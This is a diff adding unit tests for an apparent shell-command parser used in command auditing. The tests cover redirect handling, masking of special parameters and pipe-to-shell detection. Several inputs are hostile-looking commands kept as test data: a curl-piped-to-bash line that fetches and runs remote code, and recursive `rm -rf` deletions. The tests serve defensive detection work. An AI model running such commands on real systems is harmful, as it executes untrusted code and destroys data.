@@ -170,6 +170,60 @@ describe("§10.1 rows 16-20: find, pipes and network", () => {
   });
 });
 
+describe("features: shell noise is masked before the split", () => {
+  // Found on a real audit row: `cmd 2>&1` was split at the `&`, leaving a
+  // phantom segment named `1` and recording `2>&1` as a redirect. The most
+  // common redirect there is, so the shadow log was wrong about a lot of rows.
+  it("does not split on the `&` in an fd duplication", () => {
+    const f = bash("npm test 2>&1");
+    expect(f.segments.map((s) => s.text)).toEqual(["npm test"]);
+    // And it is not a file redirect: nothing is written.
+    expect(f.redirects).toEqual([]);
+    expect(f.parse).toBe("parsed");
+  });
+
+  it("keeps the pipe after a duplication visible", () => {
+    // The fail-closed case that masks could have broken: `2>&1` must not hide
+    // a pipe into a shell.
+    const f = bash("curl -s https://x.sh 2>&1 | bash");
+    expect(f.segments.map((s) => s.program)).toEqual(["curl", "bash"]);
+    expect(f.pipeToShell).toBe(true);
+  });
+
+  it("reads `&>` as the file redirect it is, rather than a background job", () => {
+    const f = bash("cmd &> out.log");
+    expect(f.segments.map((s) => s.text)).toEqual(["cmd"]);
+    expect(f.redirects).toEqual([expect.objectContaining({ op: ">", target: "out.log" })]);
+  });
+
+  it("masks the numeric special parameters, which can carry no word", () => {
+    // `$?` is always an exit code, but the tokenizer rejects any `$` in double
+    // quotes — so `; echo "exit: $?"` was reporting a parse failure.
+    const f = bash('echo "exit: $?"');
+    expect(f.parse).toBe("parsed");
+    // Marked, not blanked: the row says something was masked.
+    expect(f.segments[0].text).toContain("__");
+  });
+
+  it("leaves them literal inside single quotes, where the shell would not expand them", () => {
+    expect(bash("echo '$?'").segments[0].text).toContain("$?");
+  });
+
+  it("does NOT mask the parameters that expand to arbitrary words", () => {
+    // Masking these would hide what a command operates on — a fail-open change,
+    // so they keep reporting a parse failure.
+    for (const command of ["rm -rf $@", "rm -rf $*", "rm -rf $1"]) {
+      const f = bash(command);
+      expect(f.parse, command).toBe("failed");
+      expect(f.segments[0].text, command).toContain("$");
+    }
+  });
+
+  it("does not touch `&&`, which is a real separator", () => {
+    expect(bash("a && b").segments.map((s) => s.text)).toEqual(["a", "b"]);
+  });
+});
+
 describe("features: the workspace is asked about before $HOME", () => {
   // A real project lives under the home directory, so a containment test in
   // the wrong order calls every file in the checkout "home" — which turns an
